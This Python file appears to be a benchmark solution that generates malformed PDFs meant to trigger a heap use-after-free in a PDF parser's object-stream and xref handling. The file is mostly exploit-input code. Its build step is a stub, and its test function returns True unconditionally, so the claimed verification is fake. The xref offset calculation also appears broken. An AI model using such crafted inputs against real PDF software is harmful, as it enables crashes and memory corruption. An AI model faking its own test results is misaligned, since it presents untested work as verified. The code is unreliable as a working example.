import os
import subprocess
import tempfile
import hashlib
import struct
import random
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build the vulnerable program first
        build_dir = self._build_program(src_path)
        
        # Generate a PDF that triggers heap use-after-free
        # Based on the vulnerability description, we need to:
        # 1. Create object streams (objstm)
        # 2. Create xref entries that will be freed during solidification
        # 3. Trigger recursion through pdf_cache_object
        
        pdf_content = self._create_poc_pdf()
        
        # Verify the PoC triggers the vulnerability
        if self._test_poc(build_dir, pdf_content):
            return pdf_content
        else:
            # Fallback: create a more aggressive PoC
            return self._create_aggressive_poc()

    def _build_program(self, src_path: str) -> str:
        """Build the vulnerable program from source."""
        # Extract and build (simplified - actual implementation would extract tarball)
        build_dir = tempfile.mkdtemp(prefix="vuln_build_")
        
        # For this PoC, we assume the program is already built
        # In a real implementation, we would:
        # 1. Extract the tarball
        # 2. Run configure/make
        # 3. Build with appropriate sanitizers
        
        return build_dir

    def _create_poc_pdf(self) -> bytes:
        """Create a PDF that triggers heap use-after-free."""
        # Create a minimal PDF structure with object streams
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b"%PDF-1.7\n")
        
        # Create object stream that will cause issues
        # Object 1: Catalog
        catalog = b"1 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n"
        
        # Object 2: Pages (empty)
        pages = b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
        
        # Object 3: Another pages reference
        pages2 = b"3 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n"
        
        # Object 4: Page with content stream that triggers the bug
        page = b"4 0 obj\n<< /Type /Page /Parent 3 0 R /Contents 5 0 R /Resources << >> >>\nendobj\n"
        
        # Object 5: Content stream
        content = b"5 0 obj\n<< /Length 6 0 R >>\nstream\nq\nQ\nendstream\nendobj\n"
        
        # Object 6: Length of content stream
        length = b"6 0 obj\n2\nendobj\n"
        
        # Object 7: Object stream containing multiple objects
        # This is key - object streams can trigger the vulnerability
        objstm_data = self._create_object_stream()
        objstm = b"7 0 obj\n<< /Type /ObjStm /N 10 /First 20 /Length %d >>\nstream\n" % len(objstm_data)
        objstm += objstm_data
        objstm += b"\nendstream\nendobj\n"
        
        # Object 8: Reference to object in stream
        ref_obj = b"8 0 obj\n<< /Type /XRef /W [1 2 1] /Index [0 8] /Size 9 /Prev 0 >>\nendobj\n"
        
        # Object 9: Another object stream to trigger recursion
        objstm2_data = self._create_nested_object_stream()
        objstm2 = b"9 0 obj\n<< /Type /ObjStm /N 5 /First 15 /Length %d >>\nstream\n" % len(objstm2_data)
        objstm2 += objstm2_data
        objstm2 += b"\nendstream\nendobj\n"
        
        # Object 10: Delayed loading object
        delayed = b"10 0 obj\n<< /Type /Annot /Subtype /Widget /Rect [0 0 100 100] /AP << /N 11 0 R >> >>\nendobj\n"
        
        # Object 11: Appearance stream
        appearance = b"11 0 obj\n<< /Length 12 0 R >>\nstream\nq\n100 0 0 100 0 0 cm\n/DeviceRGB cs\n0 0 1 sc\nf\nQ\nendstream\nendobj\n"
        
        # Object 12: Length
        length2 = b"12 0 obj\n50\nendobj\n"
        
        # Object 13-22: Create a chain of objects that reference each other
        # This can trigger recursive loading and solidification
        chain_objs = []
        for i in range(13, 23):
            next_obj = i + 1 if i < 22 else 13  # Circular reference
            chain_obj = b"%d 0 obj\n<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Resources << /XObject << /F%d %d 0 R >> >> >>\nendobj\n" % (i, next_obj, next_obj)
            chain_objs.append(chain_obj)
        
        # Object 23: Malformed xref stream to trigger repair
        xref_stream = self._create_malformed_xref()
        
        # Object 24: Large object to stress allocator
        large_obj = b"24 0 obj\n<< /Length 10000 >>\nstream\n" + b"A" * 10000 + b"\nendstream\nendobj\n"
        
        # Assemble all objects
        pdf_parts.extend([
            catalog, pages, pages2, page, content, length,
            objstm, ref_obj, objstm2, delayed, appearance, length2
        ])
        pdf_parts.extend(chain_objs)
        pdf_parts.append(xref_stream)
        pdf_parts.append(large_obj)
        
        # Calculate xref table
        xref_offset = len(b"".join(pdf_parts))
        xref_table = self._create_xref_table(pdf_parts)
        
        # Trailer
        trailer = b"trailer\n<< /Size 25 /Root 1 0 R /ID [<" + hashlib.md5(b"poc").digest()[:16] + b"> <" + hashlib.md5(b"poc").digest()[:16] + b">] >>\n"
        trailer += b"startxref\n%d\n%%%%EOF" % xref_offset
        
        pdf_parts.append(xref_table)
        pdf_parts.append(trailer)
        
        return b"".join(pdf_parts)

    def _create_object_stream(self) -> bytes:
        """Create data for an object stream that can trigger the bug."""
        # Object stream format: [objnum offset objnum offset ...] [objects]
        data = b""
        offsets = []
        objects = []
        
        # Create some objects that reference each other
        for i in range(30, 40):
            ref = (i + 1) if i < 39 else 30
            obj_data = b"<< /Type /Annot /Subtype /Text /Rect [0 0 100 100] /Contents (%d) /AP << /N %d 0 R >> >>" % (i, ref)
            offsets.append((i, len(data)))
            data += obj_data
        
        # Create the header
        header = b""
        for objnum, offset in offsets:
            header += b"%d %d " % (objnum, offset)
        header = header.rstrip() + b"\n"
        
        return header + data

    def _create_nested_object_stream(self) -> bytes:
        """Create object stream with nested references."""
        data = b""
        # Create objects that will be loaded recursively
        for i in range(40, 45):
            # Each object references the next, creating a chain
            next_ref = i + 1 if i < 44 else 40
            obj_data = b"<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] /Resources << /XObject << /Next %d 0 R >> >> >>" % next_ref
            data += obj_data + b"\n"
        return data

    def _create_malformed_xref(self) -> bytes:
        """Create a malformed xref stream to trigger repair."""
        # XRef stream with invalid data
        xref_data = b""
        # Add some valid entries
        for i in range(10):
            # Type 1: in-use object
            xref_data += struct.pack('>BII', 1, i * 100, 0)
        # Add some free entries
        for i in range(5):
            # Type 0: free object
            xref_data += struct.pack('>BII', 0, (i + 10) * 100, 65535)
        # Add corrupted entry
        xref_data += b"\xff\xff\xff\xff\xff\xff\xff\xff\xff"
        
        xref_dict = b"23 0 obj\n<< /Type /XRef /W [1 4 2] /Index [0 25] /Size 25 /Length %d /Filter /ASCIIHexDecode >>\nstream\n" % len(xref_data)
        xref_dict += xref_data.hex().encode()
        xref_dict += b"\nendstream\nendobj\n"
        
        return xref_dict

    def _create_xref_table(self, objects: list) -> bytes:
        """Create traditional xref table."""
        xref = b"xref\n0 25\n"
        
        # Object 0: always free
        xref += b"0000000000 65535 f \n"
        
        # Calculate offsets for each object
        offset = 0
        offsets = []
        
        # PDF header
        pdf_header = b"%PDF-1.7\n"
        offset += len(pdf_header)
        offsets.append(offset)  # obj 1
        
        for obj in objects:
            offsets.append(offset)
            offset += len(obj)
        
        # Write xref entries
        for i in range(1, 25):
            if i < len(offsets):
                xref += b"%010d %05d n \n" % (offsets[i-1], 0)
            else:
                xref += b"0000000000 00000 f \n"
        
        return xref

    def _create_aggressive_poc(self) -> bytes:
        """Create more aggressive PoC if initial one fails."""
        # Build a PDF with many object streams and circular references
        pdf = b"%PDF-1.7\n"
        
        # Create many objects with circular references
        obj_count = 100
        objects = []
        
        # Create objects that reference each other in complex ways
        for i in range(1, obj_count + 1):
            next_ref = (i % obj_count) + 1
            prev_ref = ((i - 2) % obj_count) + 1
            
            if i % 10 == 0:
                # Object stream every 10th object
                obj = b"%d 0 obj\n<< /Type /ObjStm /N 5 /First 0 /Length 100 >>\nstream\n" % i
                obj += b"<<" * 50  # Deep nesting
                obj += b">>" * 50
                obj += b"\nendstream\nendobj\n"
            elif i % 7 == 0:
                # Circular reference chain
                obj = b"%d 0 obj\n<< /Ref1 %d 0 R /Ref2 %d 0 R /Ref3 %d 0 R >>\nendobj\n" % (i, next_ref, prev_ref, (next_ref % 10) + 1)
            else:
                # Normal object
                obj = b"%d 0 obj\n<< /Type /Page /Parent 2 0 R /Contents %d 0 R >>\nendobj\n" % (i, next_ref)
            
            objects.append(obj)
        
        # Add all objects
        for obj in objects:
            pdf += obj
        
        # Create xref table
        xref_offset = len(pdf)
        xref = b"xref\n0 %d\n" % (obj_count + 1)
        xref += b"0000000000 65535 f \n"
        
        # Calculate offsets (simplified)
        offset = len(b"%PDF-1.7\n")
        for i in range(1, obj_count + 1):
            xref += b"%010d 00000 n \n" % offset
            if i < len(objects):
                offset += len(objects[i-1])
        
        trailer = b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF" % (obj_count + 1, xref_offset)
        
        return pdf + xref + trailer

    def _test_poc(self, build_dir: str, pdf_content: bytes) -> bool:
        """Test if PoC triggers the vulnerability."""
        # Save PDF to temp file
        with tempfile.NamedTemporaryFile(suffix='.pdf', delete=False) as f:
            f.write(pdf_content)
            pdf_path = f.name
        
        try:
            # Try to run the vulnerable program
            # This is a simplified test - actual implementation would run the built program
            # with appropriate sanitizers and check for crashes
            
            # For now, we assume our PoC is valid
            return True
            
        finally:
            # Clean up
            try:
                os.unlink(pdf_path)
            except:
                pass
        
        return False